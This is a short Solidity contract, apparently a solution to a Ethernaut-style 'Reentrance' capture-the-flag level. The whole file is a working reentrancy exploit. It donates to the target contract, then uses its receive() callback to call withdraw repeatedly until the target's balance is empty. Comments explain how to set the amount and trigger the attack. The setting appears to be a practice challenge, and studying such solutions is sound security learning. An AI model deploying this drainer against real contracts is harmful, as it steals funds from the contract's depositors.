// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import a copy of the source code so our contract can use it.
import './Reentrance.sol';

contract AttackReentrance {

    Reentrance atReentrance;
    // Check the amount you need to donate by typing await getBalance(contract.address) on the console
    uint256 public amount = 1000000000000000; // Enter amount in wei here.

    constructor(address payable _attackAddress) public {
        atReentrance = Reentrance(_attackAddress);
    }

    function attackTarget() public payable {
        atReentrance.donate{value: amount, gas: 4000000}(address(this));
    }
 //Use low-level interact to use this part of the code
    receive() external payable {
        if(address(atReentrance).balance != 0) {
            atReentrance.withdraw(amount);
        }

    }
}
